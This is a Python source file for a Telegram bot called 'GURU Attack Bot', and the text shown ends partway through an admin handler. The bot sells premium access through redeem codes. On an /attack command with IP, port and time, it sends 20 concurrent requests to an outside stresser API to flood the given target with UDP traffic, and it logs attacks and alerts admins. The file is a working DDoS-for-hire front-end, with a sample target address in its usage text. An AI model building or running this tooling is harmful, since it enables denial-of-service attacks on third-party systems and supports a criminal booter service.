# app.py - COMPLETE FIXED VERSION WITH MENU BUTTONS
import os
import logging
import asyncio
import threading
import aiohttp
import time
import random
import string
from datetime import datetime, timedelta
from flask import Flask, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import (
    Application, 
    CommandHandler, 
    CallbackQueryHandler, 
    MessageHandler, 
    filters, 
    ContextTypes
)
from pymongo import MongoClient
from dotenv import load_dotenv

load_dotenv()

# ===== CONFIGURATION =====
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
API_KEY = os.getenv("API_KEY")
MONGO_URI = os.getenv("MONGO_URI")
OWNER_ID = int(os.getenv("OWNER_ID", "123456789"))
PSEUDO_OWNER_ID = int(os.getenv("PSEUDO_OWNER_ID", "987654321"))
PORT = int(os.getenv("PORT", 8080))
MAX_CONCURRENT = 20

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ===== FLASK APP =====
flask_app = Flask(__name__)

@flask_app.route('/')
def index():
    return "🤖 GURU Attack Bot is Running!"

@flask_app.route('/health')
def health():
    return jsonify({"status": "healthy", "timestamp": datetime.now().isoformat()})

# ===== DATABASE =====
class Database:
    def __init__(self, mongo_uri):
        self.memory_mode = False
        try:
            if mongo_uri:
                self.client = MongoClient(mongo_uri, serverSelectionTimeoutMS=5000)
                self.client.admin.command('ping')
                self.db = self.client["guru_bot"]
                self.users = self.db.users
                self.codes = self.db.redeem_codes
                self.logs = self.db.attack_logs
                self.admins = self.db.admins
                
                self.users.create_index("user_id", unique=True)
                self.codes.create_index("code", unique=True)
                
                logger.info("✅ MongoDB connected")
            else:
                raise Exception("No MongoDB URI")
        except Exception as e:
            logger.warning(f"⚠️ MongoDB failed: {e}, using in-memory")
            self.memory_mode = True
            self.users = {}
            self.codes = {}
            self.logs = []
            self.admins = {}
    
    def add_user(self, user_id, username=None, first_name=None):
        if not self.memory_mode:
            result = self.users.update_one(
                {"user_id": user_id},
                {"$set": {
                    "username": username, 
                    "first_name": first_name, 
                    "last_active": datetime.now(),
                    "plan": "free",
                    "plan_expiry": None,
                    "has_used_code": False,
                    "is_banned": False,
                    "ban_reason": None,
                    "banned_by": None,
                    "banned_at": None
                }},
                upsert=True
            )
            return result
        else:
            if user_id not in self.users:
                self.users[user_id] = {
                    "user_id": user_id, 
                    "username": username, 
                    "first_name": first_name,
                    "plan": "free",
                    "plan_expiry": None,
                    "has_used_code": False,
                    "is_banned": False
                }
                return True
            return False
    
    def get_user(self, user_id):
        if not self.memory_mode:
            return self.users.find_one({"user_id": user_id})
        return self.users.get(user_id)
    
    def get_user_plan(self, user_id):
        user = self.get_user(user_id)
        if not user:
            return "free", None
        
        plan = user.get("plan", "free")
        expiry = user.get("plan_expiry")
        
        if expiry and isinstance(expiry, str):
            try:
                expiry = datetime.fromisoformat(expiry)
            except:
                expiry = None
        
        if expiry and isinstance(expiry, datetime):
            if expiry < datetime.now():
                plan = "free"
                self.update_user_plan(user_id, "free", None)
                expiry = None
        
        return plan, expiry
    
    def update_user_plan(self, user_id, plan, expiry):
        if not self.memory_mode:
            expiry_str = expiry.isoformat() if expiry and isinstance(expiry, datetime) else None
            result = self.users.update_one(
                {"user_id": user_id},
                {"$set": {"plan": plan, "plan_expiry": expiry_str}}
            )
            return result.modified_count > 0
        else:
            if user_id in self.users:
                self.users[user_id]["plan"] = plan
                self.users[user_id]["plan_expiry"] = expiry
                return True
            return False
    
    def get_user_stats(self, user_id):
        if not self.memory_mode:
            return self.logs.count_documents({"user_id": user_id})
        else:
            return len([l for l in self.logs if l.get("user_id") == user_id])
    
    def get_total_attacks(self):
        if not self.memory_mode:
            return self.logs.count_documents({})
        return len(self.logs)
    
    def is_admin(self, user_id):
        if not self.memory_mode:
            return self.admins.find_one({"user_id": user_id}) is not None
        return user_id in self.admins
    
    def get_admin_level(self, user_id):
        if not self.memory_mode:
            admin = self.admins.find_one({"user_id": user_id})
            return admin.get("level") if admin else None
        return self.admins.get(user_id, {}).get("level")
    
    def is_owner_or_pseudo(self, user_id):
        level = self.get_admin_level(user_id)
        return level in ["owner", "pseudo_owner"]
    
    def add_admin(self, user_id, username, level, added_by):
        if not self.memory_mode:
            if self.admins.find_one({"user_id": user_id}):
                return False
            self.admins.insert_one({
                "user_id": user_id,
                "username": username,
                "level": level,
                "added_by": added_by,
                "added_at": datetime.now()
            })
            self.update_user_plan(user_id, "premium", None)
            return True
        else:
            if user_id in self.admins:
                return False
            self.admins[user_id] = {"user_id": user_id, "level": level}
            if user_id in self.users:
                self.users[user_id]["plan"] = "premium"
                self.users[user_id]["plan_expiry"] = None
            return True
    
    def remove_admin(self, user_id):
        if not self.memory_mode:
            result = self.admins.delete_one({"user_id": user_id})
            return result.deleted_count > 0
        else:
            if user_id in self.admins:
                del self.admins[user_id]
                return True
        return False
    
    def get_admins(self):
        if not self.memory_mode:
            return list(self.admins.find({}))
        return [{"user_id": uid, "level": data.get("level", "admin")} for uid, data in self.admins.items()]
    
    def get_admin_ids(self):
        admins = self.get_admins()
        return [admin.get("user_id") for admin in admins]
    
    def ban_user(self, user_id, reason=None, banned_by=None):
        if not self.memory_mode:
            self.users.update_one(
                {"user_id": user_id},
                {"$set": {
                    "is_banned": True, 
                    "ban_reason": reason, 
                    "banned_by": banned_by, 
                    "banned_at": datetime.now()
                }}
            )
        elif user_id in self.users:
            self.users[user_id]["is_banned"] = True
            self.users[user_id]["ban_reason"] = reason
    
    def unban_user(self, user_id):
        if not self.memory_mode:
            self.users.update_one(
                {"user_id": user_id},
                {"$set": {
                    "is_banned": False, 
                    "ban_reason": None,
                    "banned_by": None,
                    "banned_at": None
                }}
            )
        elif user_id in self.users:
            self.users[user_id]["is_banned"] = False
            self.users[user_id]["ban_reason"] = None
    
    def is_banned(self, user_id):
        user = self.get_user(user_id)
        return user.get("is_banned", False) if user else False
    
    def create_code(self, code, days, created_by):
        if not self.memory_mode:
            if self.codes.find_one({"code": code}):
                return False
            self.codes.insert_one({
                "code": code,
                "access_days": days,
                "created_by": created_by,
                "created_at": datetime.now(),
                "used_by": None,
                "used_at": None,
                "is_used": False
            })
            return True
        else:
            if code in self.codes:
                return False
            self.codes[code] = {
                "code": code,
                "access_days": days,
                "created_at": datetime.now(),
                "is_used": False
            }
            return True
    
    def use_code(self, code, user_id):
        if not self.memory_mode:
            code_data = self.codes.find_one({"code": code, "is_used": False})
            if code_data:
                self.codes.update_one(
                    {"code": code},
                    {"$set": {"is_used": True, "used_by": user_id, "used_at": datetime.now()}}
                )
                expiry = datetime.now() + timedelta(days=code_data['access_days'])
                self.update_user_plan(user_id, "premium", expiry)
                self.users.update_one(
                    {"user_id": user_id},
                    {"$set": {"has_used_code": True, "code_used": code}}
                )
                return code_data
        else:
            if code in self.codes and not self.codes[code]["is_used"]:
                code_data = self.codes[code]
                code_data["is_used"] = True
                expiry = datetime.now() + timedelta(days=code_data['access_days'])
                if user_id in self.users:
                    self.users[user_id]["plan"] = "premium"
                    self.users[user_id]["plan_expiry"] = expiry
                    self.users[user_id]["has_used_code"] = True
                    self.users[user_id]["code_used"] = code
                return code_data
        return None
    
    def get_codes(self, only_unused=False):
        if not self.memory_mode:
            query = {"is_used": False} if only_unused else {}
            return list(self.codes.find(query).sort("created_at", -1))
        else:
            codes = list(self.codes.values())
            if only_unused:
                codes = [c for c in codes if not c["is_used"]]
            return codes
    
    def delete_code(self, code):
        if not self.memory_mode:
            result = self.codes.delete_one({"code": code})
            return result.deleted_count > 0
        else:
            if code in self.codes:
                del self.codes[code]
                return True
        return False
    
    def log_attack(self, user_id, target, port, duration, method, status, response, concurrent_count=20):
        log = {
            "user_id": user_id,
            "target": target,
            "port": port,
            "duration": duration,
            "method": method,
            "status": status,
            "concurrent": concurrent_count,
            "response": response[:500] if response else None,
            "timestamp": datetime.now()
        }
        if not self.memory_mode:
            self.logs.insert_one(log)
        else:
            self.logs.append(log)
        
        user = self.get_user(user_id)
        username = user.get("username") if user else None
        first_name = user.get("first_name") if user else None
        return {
            "user_id": user_id,
            "username": username,
            "first_name": first_name,
            "target": target,
            "port": port,
            "duration": duration,
            "method": method,
            "concurrent": concurrent_count
        }
    
    def get_all_users(self):
        if not self.memory_mode:
            return list(self.users.find({}))
        return list(self.users.values())
    
    def get_banned_users(self):
        if not self.memory_mode:
            return list(self.users.find({"is_banned": True}))
        return [uid for uid, data in self.users.items() if data.get("is_banned", False)]

db = Database(MONGO_URI)

# ===== INITIALIZE OWNER =====
def init_owner():
    owner = db.get_user(OWNER_ID)
    if not owner:
        db.add_user(OWNER_ID, "owner", "Owner")
    
    if not db.is_admin(OWNER_ID):
        db.add_admin(OWNER_ID, "owner", "owner", OWNER_ID)
    
    plan, expiry = db.get_user_plan(OWNER_ID)
    if plan != "premium":
        db.update_user_plan(OWNER_ID, "premium", None)

init_owner()

# ===== ATTACK MANAGER =====
class AttackManager:
    def __init__(self):
        self.active_attacks = {}
        self.attack_counter = 0
        self.lock = threading.Lock()
        self.total_attacks = 0
        self.concurrent_busy = 0
    
    def can_start_attack(self, user_id):
        with self.lock:
            user_attacks = sum(1 for a in self.active_attacks.values() if a['user_id'] == user_id)
            if user_attacks >= MAX_CONCURRENT:
                return False, f"❌ Already running {user_attacks}/{MAX_CONCURRENT} concurrent attacks"
            if len(self.active_attacks) >= 100:
                return False, "❌ Too many active attacks globally."
            return True, "OK"
    
    def start_attack(self, user_id, target, port, duration, method, attack_num):
        with self.lock:
            self.attack_counter += 1
            attack_id = self.attack_counter
            self.total_attacks += 1
            self.concurrent_busy = len(self.active_attacks) + 1
            self.active_attacks[attack_id] = {
                'id': attack_id,
                'user_id': user_id,
                'target': target,
                'port': port,
                'duration': duration,
                'method': method,
                'attack_num': attack_num,
                'start_time': datetime.now(),
                'status': 'running'
            }
            return attack_id
    
    def stop_attack(self, attack_id):
        with self.lock:
            if attack_id in self.active_attacks:
                self.active_attacks[attack_id]['status'] = 'stopped'
                self.concurrent_busy = max(0, self.concurrent_busy - 1)
                return True
            return False
    
    def stop_all_attacks(self):
        with self.lock:
            for aid in list(self.active_attacks.keys()):
                self.active_attacks[aid]['status'] = 'stopped'
            self.concurrent_busy = 0
            return True
    
    def get_active_attacks(self, user_id=None):
        with self.lock:
            if user_id:
                return {aid: att for aid, att in self.active_attacks.items() if att['user_id'] == user_id and att['status'] == 'running'}
            return {aid: att for aid, att in self.active_attacks.items() if att['status'] == 'running'}
    
    def get_stats(self):
        with self.lock:
            active = len([a for a in self.active_attacks.values() if a['status'] == 'running'])
            return {
                'active': active,
                'concurrent_busy': self.concurrent_busy,
                'total': self.total_attacks,
                'max': MAX_CONCURRENT
            }
    
    def cleanup(self):
        with self.lock:
            now = datetime.now()
            to_remove = []
            for aid, att in self.active_attacks.items():
                if att['status'] == 'stopped':
                    to_remove.append(aid)
                elif (now - att['start_time']).seconds > att['duration'] + 15:
                    to_remove.append(aid)
            for aid in to_remove:
                del self.active_attacks[aid]
                self.concurrent_busy = max(0, self.concurrent_busy - 1)
            return len(to_remove)

attack_manager = AttackManager()

# ===== SEND ALERT TO ADMINS =====
async def send_attack_alert(attack_info):
    try:
        admins = db.get_admins()
        user = db.get_user(attack_info['user_id'])
        plan = user.get('plan', 'free') if user else 'free'
        
        message = (
            f"⚡ *ATTACK ALERT*\n\n"
            f"👤 User: {attack_info.get('first_name', 'Unknown')}\n"
            f"🆔 ID: `{attack_info['user_id']}`\n"
            f"📊 Plan: {plan.upper()}\n"
            f"🎯 Target: `{attack_info['target']}:{attack_info['port']}`\n"
            f"⏱️ Duration: {attack_info['duration']}s\n"
            f"📡 Method: {attack_info['method'].upper()}\n"
            f"🔄 Concurrent: {attack_info['concurrent']}\n"
            f"📅 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
        
        for admin in admins:
            try:
                global application
                if application:
                    await application.bot.send_message(
                        admin['user_id'],
                        message,
                        parse_mode='Markdown'
                    )
            except:
                pass
    except Exception as e:
        logger.error(f"Alert error: {e}")

# ===== API-ONLY UDP ATTACK =====
async def send_udp_attack(target, port, duration, attack_num):
    url = "https://api.susstresser.com/panel/api/api.php"
    
    params = {
        "key": API_KEY,
        "host": target,
        "port": port,
        "time": duration,
        "method": "udp"
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive"
    }
    
    try:
        timeout = aiohttp.ClientTimeout(total=duration + 15)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            start_time = time.time()
            async with session.get(url, params=params, headers=headers) as response:
                elapsed = time.time() - start_time
                result_text = await response.text()
                
                if response.status == 200:
                    return {
                        "success": True,
                        "attack_num": attack_num,
                        "method": "API",
                        "status": response.status,
                        "elapsed": f"{elapsed:.2f}s"
                    }
                else:
                    return {
                        "success": False,
                        "attack_num": attack_num,
                        "method": "API",
                        "status": response.status,
                        "elapsed": f"{elapsed:.2f}s"
                    }
                    
    except Exception as e:
        logger.error(f"Attack {attack_num} failed: {e}")
        return {
            "success": False,
            "attack_num": attack_num,
            "method": "API",
            "error": str(e)
        }

# ===== 20 CONCURRENT ATTACKS WITH LIVE UPDATES =====
async def send_20_concurrent_attacks(target, port, duration, user_id, context):
    logger.info(f"🚀 Launching 20 concurrent UDP attacks on {target}:{port}")
    
    status_msg = await context.bot.send_message(
        chat_id=user_id,
        text=f"🔥 *ATTACK RUNNING*\n\n"
             f"🎯 Target: `{target}:{port}`\n"
             f"⏱️ Duration: `{duration}s`\n"
             f"⚡ Attacks: `20 CONCURRENT`\n"
             f"⏳ Time Remaining: `{duration}s`\n\n"
             f"🔄 Attack in progress...",
        parse_mode='Markdown'
    )
    
    tasks = []
    for i in range(1, 21):
        task = send_udp_attack(target, port, duration, i)
        tasks.append(task)
    
    timer_task = asyncio.create_task(update_timer(status_msg, duration, target, port))
    results = await asyncio.gather(*tasks)
    timer_task.cancel()
    
    success_count = sum(1 for r in results if r.get('success', False))
    
    final_text = (
        f"✅ *20x UDP ATTACK COMPLETE!*\n\n"
        f"🎯 Target: `{target}:{port}`\n"
        f"⏱️ Duration: `{duration}s`\n"
        f"🎯 Attacks: `{success_count}/20 SUCCESSFUL`\n"
        f"⚡ Status: ✅ {'COMPLETED' if success_count > 0 else 'FAILED'}"
    )
    
    await status_msg.edit_text(final_text, parse_mode='Markdown')
    
    return {
        "success": success_count > 0,
        "total_attacks": len(results),
        "successful": success_count,
        "results": results,
        "target": target,
        "port": port,
        "duration": duration
    }

async def update_timer(status_msg, duration, target, port):
    try:
        start_time = time.time()
        last_update = 0
        
        while True:
            elapsed = time.time() - start_time
            remaining = max(0, int(duration - elapsed))
            
            if remaining <= 0:
                break
            
            if int(elapsed) % 5 == 0 and int(elapsed) != last_update:
                last_update = int(elapsed)
                try:
                    await status_msg.edit_text(
                        f"🔥 *ATTACK RUNNING*\n\n"
                        f"🎯 Target: `{target}:{port}`\n"
                        f"⏱️ Duration: `{duration}s`\n"
                        f"⚡ Attacks: `20 CONCURRENT`\n"
                        f"⏳ Time Remaining: `{remaining}s`\n\n"
                        f"🔄 Attack in progress...",
                        parse_mode='Markdown'
                    )
                except:
                    pass
            
            await asyncio.sleep(1)
            
    except asyncio.CancelledError:
        pass
    except Exception as e:
        logger.error(f"Timer update error: {e}")

# ===== KEYBOARD MENUS =====
def get_main_menu(user_id):
    """Get the main menu keyboard"""
    is_admin = db.is_admin(user_id)
    is_owner = db.is_owner_or_pseudo(user_id)
    is_banned = db.is_banned(user_id)
    plan, expiry = db.get_user_plan(user_id)
    is_premium = plan == "premium"
    
    keyboard = []
    
    # Row 1: Attack (only for premium or admin)
    if not is_banned and (is_premium or is_admin):
        keyboard.append([KeyboardButton("💥 ATTACK")])
    
    # Row 2: My Plan and My Info
    row2 = []
    row2.append(KeyboardButton("👤 MY PLAN"))
    if not is_admin:
        row2.append(KeyboardButton("👤 MY INFO"))
    keyboard.append(row2)
    
    # Row 3: Admin/Stats buttons
    row3 = []
    if is_admin:
        row3.append(KeyboardButton("📊 STATS"))
        row3.append(KeyboardButton("⚙️ ADMIN"))
    keyboard.append(row3) if row3 else None
    
    # Row 4: Owner buttons
    row4 = []
    if is_owner:
        row4.append(KeyboardButton("👑 OWNER"))
    keyboard.append(row4) if row4 else None
    
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_admin_menu():
    """Admin menu keyboard"""
    keyboard = [
        [KeyboardButton("➕ GENERATE CODE")],
        [KeyboardButton("📋 LIST CODES")],
        [KeyboardButton("🗑️ DELETE CODE")],
        [KeyboardButton("📊 STATS")],
        [KeyboardButton("🔙 BACK")]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_owner_menu():
    """Owner menu keyboard"""
    keyboard = [
        [KeyboardButton("🛑 KILL SWITCH")],
        [KeyboardButton("👑 PROMOTE ADMIN")],
        [KeyboardButton("👑 DEMOTE ADMIN")],
        [KeyboardButton("🚫 BAN USER")],
        [KeyboardButton("✅ UNBAN USER")],
        [KeyboardButton("📋 LIST ADMINS")],
        [KeyboardButton("📋 LIST USERS")],
        [KeyboardButton("🚫 BANNED USERS")],
        [KeyboardButton("📊 STATS")],
        [KeyboardButton("🔙 BACK")]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

# ===== BOT HANDLERS =====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    
    # Clear any user data
    context.user_data.clear()
    
    # Add user to database
    db.add_user(user_id, user.username, user.first_name)
    
    # Check if user has premium
    plan, expiry = db.get_user_plan(user_id)
    is_admin = db.is_admin(user_id)
    
    logger.info(f"User {user_id} - Plan: {plan}, Expiry: {expiry}, Is Admin: {is_admin}")
    
    total_attacks = db.get_user_stats(user_id)
    
    if plan == "premium":
        if expiry:
            days_left = max(0, (expiry - datetime.now()).days)
            plan_display = f"💎 PREMIUM ({days_left}d left)"
        else:
            plan_display = "💎 PREMIUM (Lifetime)"
    else:
        plan_display = "🆓 FREE (Redeem code to upgrade)"
    
    first_name = user.first_name or "User"
    welcome_msg = (
        f"👋 *WELCOME TO GURU*\n\n"
        f"Hello {first_name}! 👋\n"
        f"📊 Total Attacks: {total_attacks}\n"
        f"📊 Plan: {plan_display}\n"
        f"⚡ 20x UDP Concurrent: {'✅ ENABLED' if plan == 'premium' else '❌ PREMIUM ONLY'}\n"
        f"⚡ Status: {'✅ ACTIVE' if not db.is_banned(user_id) else '❌ BANNED'}\n\n"
        f"{'💡 Use /redeem CODE to get premium access!' if plan != 'premium' else '🎯 Click ATTACK to start attacking!'}"
    )
    
    await update.message.reply_text(
        welcome_msg,
        reply_markup=get_main_menu(user_id),
        parse_mode='Markdown'
    )

# ===== ATTACK COMMAND =====
async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    plan, expiry = db.get_user_plan(user_id)
    is_admin = db.is_admin(user_id)
    
    if plan != "premium" and not is_admin:
        await update.message.reply_text(
            "❌ *PREMIUM REQUIRED*\n\n"
            "You need a premium plan to attack.\n"
            "Use `/redeem CODE` to activate.\n\n"
            "Contact an admin to get a redeem code.",
            parse_mode='Markdown',
            reply_markup=get_main_menu(user_id)
        )
        return
    
    if plan == "premium" and expiry and expiry < datetime.now():
        await update.message.reply_text(
            "❌ *PLAN EXPIRED*\n\n"
            "Your premium plan has expired.\n"
            "Please redeem a new code.",
            parse_mode='Markdown',
            reply_markup=get_main_menu(user_id)
        )
        return
    
    if db.is_banned(user_id):
        await update.message.reply_text(
            "❌ You are banned!",
            reply_markup=get_main_menu(user_id)
        )
        return
    
    args = context.args
    if len(args) < 3:
        await update.message.reply_text(
            "❌ *Usage:* `/attack IP PORT TIME`\n\n"
            "Example: `/attack 91.108.17.41 32001 60`\n\n"
            "⚡ 20 concurrent UDP attacks!\n"
            "⏱️ Time: 60-300 seconds",
            parse_mode='Markdown',
            reply_markup=get_main_menu(user_id)
        )
        return
    
    try:
        target = args[0]
        port = int(args[1])
        duration = int(args[2])
        
        if duration < 60:
            await update.message.reply_text("❌ Minimum duration is 60 seconds!", reply_markup=get_main_menu(user_id))
            return
        if duration > 300:
            await update.message.reply_text("❌ Maximum duration is 300 seconds!", reply_markup=get_main_menu(user_id))
            return
        
        can_start, msg = attack_manager.can_start_attack(user_id)
        if not can_start:
            await update.message.reply_text(msg, reply_markup=get_main_menu(user_id))
            return
        
        attack_id = attack_manager.start_attack(user_id, target, port, duration, "udp", 0)
        
        result = await send_20_concurrent_attacks(target, port, duration, user_id, context)
        
        attack_info = db.log_attack(
            user_id, target, port, duration, "udp",
            "success" if result.get('success') else "failed",
            str(result)
        )
        
        await send_attack_alert(attack_info)
        
        attack_manager.stop_attack(attack_id)
        attack_manager.cleanup()
        
        # Show menu again after attack
        await update.message.reply_text(
            "✅ Attack completed!",
            reply_markup=get_main_menu(user_id)
        )
        
    except ValueError as e:
        await update.message.reply_text(
            f"❌ Invalid port or time! Use numbers.\nError: {e}",
            reply_markup=get_main_menu(user_id)
        )
    except Exception as e:
        await update.message.reply_text(
            f"❌ Error: {str(e)}",
            reply_markup=get_main_menu(user_id)
        )

# ===== BUTTON HANDLERS =====
async def handle_menu_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle menu button presses"""
    user_id = update.effective_user.id
    text = update.message.text
    
    logger.info(f"Menu button pressed: {text} by user {user_id}")
    
    # Check if user is banned
    if db.is_banned(user_id):
        await update.message.reply_text("❌ You are banned!", reply_markup=get_main_menu(user_id))
        return
    
    # ===== MAIN MENU BUTTONS =====
    if text == "💥 ATTACK":
        plan, expiry = db.get_user_plan(user_id)
        is_admin = db.is_admin(user_id)
        
        if plan != "premium" and not is_admin:
            await update.message.reply_text(
                "❌ *PREMIUM REQUIRED*\n\n"
                "You need a premium plan to attack.\n"
                "Use `/redeem CODE` to activate.",
                parse_mode='Markdown',
                reply_markup=get_main_menu(user_id)
            )
            return
        
        if plan == "premium" and expiry and expiry < datetime.now():
            await update.message.reply_text(
                "❌ *PLAN EXPIRED*\n\n"
                "Your premium plan has expired.\n"
                "Please redeem a new code.",
                parse_mode='Markdown',
                reply_markup=get_main_menu(user_id)
            )
            return
        
        await update.message.reply_text(
            "💥 *ATTACK*\n\n"
            "Send: `IP PORT TIME`\n"
            "Example: `91.108.17.41 32001 60`\n\n"
            "⚡ 20 concurrent UDP attacks!\n"
            "⏱️ Time: 60-300 seconds\n"
            "Send /cancel to cancel",
            parse_mode='Markdown',
            reply_markup=get_main_menu(user_id)
        )
        context.user_data['awaiting_attack'] = True
    
    elif text == "👤 MY PLAN":
        plan, expiry = db.get_user_plan(user_id)
        
        if plan == "free":
            msg = (
                "👤 *MY PLAN*\n\n"
                "📊 Plan: 🆓 FREE\n"
                "⏱️ Status: Inactive\n"
                "⚡ 20x UDP: ❌ DISABLED\n\n"
                "💡 *Upgrade:*\n"
                "Use `/redeem CODE` to get premium access.\n"
                "Contact an admin to get a code."
            )
        else:
            if expiry:
                days_left = max(0, (expiry - datetime.now()).days)
                msg = (
                    "👤 *MY PLAN*\n\n"
                    "📊 Plan: 💎 PREMIUM\n"
                    f"⏱️ Remaining: {days_left} days\n"
                    f"📅 Expires: {expiry.strftime('%Y-%m-%d %H:%M')}\n\n"
                    "📌 Features:\n"
                    "• Full access\n"
                    "• 20x UDP Concurrent\n"
                    "• Unlimited attacks"
                )
            else:
                msg = (
                    "👤 *MY PLAN*\n\n"
                    "📊 Plan: 💎 PREMIUM\n"
                    "⏱️ Status: LIFETIME\n\n"
                    "📌 Features:\n"
                    "• Full access\n"
                    "• 20x UDP Concurrent\n"
                    "• Unlimited attacks"
                )
        
        await update.message.reply_text(msg, parse_mode='Markdown', reply_markup=get_main_menu(user_id))
    
    elif text == "👤 MY INFO":
        level = db.get_admin_level(user_id) or "USER"
        plan, expiry = db.get_user_plan(user_id)
        total_attacks = db.get_user_stats(user_id)
        
        if plan == "free":
            plan_display = "FREE"
        else:
            if expiry:
                days_left = max(0, (expiry - datetime.now()).days)
                plan_display = f"PREMIUM ({days_left}d left)"
            else:
                plan_display = "PREMIUM (Lifetime)"
        
        msg = (
            f"👤 *USER INFO*\n\n"
            f"🆔 ID: {user_id}\n"
            f"⭐ Level: {level.upper()}\n"
            f"📊 Plan: {plan_display}\n"
            f"⚡ 20x UDP: {'✅ ENABLED' if plan == 'premium' else '❌ DISABLED'}\n"
            f"💥 Total Attacks: {total_attacks}"
        )
        
        await update.message.reply_text(msg, parse_mode='Markdown', reply_markup=get_main_menu(user_id))
    
    elif text == "📊 STATS":
        if not db.is_admin(user_id):
            await update.message.reply_text("❌ Access denied!", reply_markup=get_main_menu(user_id))
            return
        
        total_attacks = db.get_total_attacks()
        users = db.get_all_users()
        admins = db.get_admins()
        codes = db.get_codes()
        active = len(attack_manager.active_attacks)
        
        premium_users = sum(1 for u in users if u.get('plan') == 'premium')
        banned_users = sum(1 for u in users if u.get('is_banned', False))
        
        msg = (
            f"📊 *BOT STATISTICS*\n\n"
            f"👥 Total Users: {len(users)}\n"
            f"💎 Premium Users: {premium_users}\n"
            f"🚫 Banned Users: {banned_users}\n"
            f"👑 Admins: {len(admins)}\n"
            f"💥 Total Attacks: {total_attacks}\n"
            f"🎫 Redeem Codes: {len(codes)}\n"
            f"⚡ Active Attacks: {active}/{MAX_CONCURRENT}\n"
            f"⚡ 20x UDP: ENABLED\n"
            f"🌐 Status: ONLINE"
        )
        
        await update.message.reply_text(msg, parse_mode='Markdown', reply_markup=get_main_menu(user_id))
    
    # ===== ADMIN MENU BUTTONS =====
    elif text == "⚙️ ADMIN":
        if not db.is_admin(user_id):
            await update.message.reply_text("❌ Access denied!", reply_markup=get_main_menu(user_id))
            return
        
        await update.message.reply_text(
            "⚙️ *ADMIN PANEL*\n\nSelect action:",
            parse_mode='Markdown',
            reply_markup=get_admin_menu()
        )
    
    elif text == "➕ GENERATE CODE":
        if not db.is_admin(user_id):
            await update.message.reply_text("❌ Access denied!", reply_markup=get_main_menu(user_id))
            return
        
        keyboard = [
            [KeyboardButton("📅 1 DAY"), KeyboardButton("📅 3 DAYS")],
            [KeyboardButton("📅 7 DAYS"), KeyboardButton("📅 30 DAYS")],
            [KeyboardButton("📅 90 DAYS"), KeyboardButton("📅 LIFETIME")],
            [KeyboardButton("🔙 BACK")]
        ]
        
        await update.message.reply_text(
            "➕ *GENERATE CODE*\n\nSelect duration:",
            parse_mode='Markdown',
            reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        )
        context.user_data['awaiting_code_gen'] = True
    
    elif text == "📋 LIST CODES":
        if not db.is_admin(user_id):
            await update.message.reply_text("❌ Access denied!", reply_markup=get_main_menu(user_id))
            return
        
        codes = db.get_codes()
        if not codes:
            msg = "📋 No codes generated yet."
        else:
            msg = "📋 *REDEEM CODES*\n\n"
            for c in codes[:20]:
                status = "✅" if not c.get('is_used') else f"❌ Used"
                used_by = f" by {c.get('used_by')}" if c.get('used_by') else ""
                duration = "LIFETIME" if c['access_days'] >= 3650 else f"{c['access_days']}d"
                msg += f"`{c['code']}` - {duration} - {status}{used_by}\n"
        
        await update.message.reply_text(msg, parse_mode='Markdown', reply_markup=get_admin_menu())
    
    elif text == "🗑️ DELETE CODE":
        if not db.is_admin(user_id):
            await update.message.reply_text("❌ Access denied!", reply_markup=get_main_menu(user_id))
            return
        
        codes = db.get_codes(only_unused=True)
        if not codes:
            await update.message.reply_text("No unused codes to delete!", reply_markup=get_admin_menu())
            return
        
        keyboard = []
        for c in codes[:10]:
            keyboard.append([KeyboardButton(f"❌ {c['code']}")])
        keyboard.append([KeyboardButton("🔙 BACK")])
        
        await update.message.reply_text(
            "🗑️ *DELETE CODE*\n\nClick a code to delete:",
            parse_mode='Markdown',
            reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        )
        context.user_data['awaiting_code_delete'] = True
    
    # ===== OWNER MENU BUTTONS =====
    elif text == "👑 OWNER":
        if not db.is_owner_or_pseudo(user_id):
            await update.message.reply_text("❌ Access denied!", reply_markup=get_main_menu(user_id))
            return
        
        await update.message.reply_text(
            f"👑 *OWNER PANEL*\n\nSelect action:",
            parse_mode='Markdown',
            reply_markup=get_owner_menu()
        )
    
    elif text == "🛑 KILL SWITCH":
        if not db.is_owner_or_pseudo(user_id):
            await update.message.reply_text("❌ Access denied!", reply_markup=get_main_menu(user_id))
            return
        
        attack_manager.stop_all_attacks()
        await update.message.reply_text(
            f"🛑 *KILL SWITCH ACTIVATED*\n\n✅ All active attacks stopped\n⚡ System cleared!",
            parse_mode='Markdown',
            reply_markup=get_owner_menu()
        )
    
    elif text == "👑 PROMOTE ADMIN":
        if not db.is_owner_or_pseudo(user_id):
            await update.message.reply_text("❌ Access denied!", reply_markup=get_main_menu(user_id))
            return
        
        await update.message.reply_text(
            "👑 *PROMOTE ADMIN*\n\n"
            "Send: `USER_ID ROLE`\n"
            "Example: `123456789 pseudo_owner`\n\n"
            "Roles: admin, pseudo_owner\n"
            "Send /cancel to cancel",
            parse_mode='Markdown',
            reply_markup=get_owner_menu()
        )
        context.user_data['awaiting_promote'] = True
    
    elif text == "👑 DEMOTE ADMIN":
        if not db.is_owner_or_pseudo(user_id):
            await update.message.reply_text("❌ Access denied!", reply_markup=get_main_menu(user_id))
            return
        
        admins = db.get_admins()
        keyboard = []
        for admin in admins:
            if admin['user_id'] != OWNER_ID:
                level = admin.get('level', 'admin')
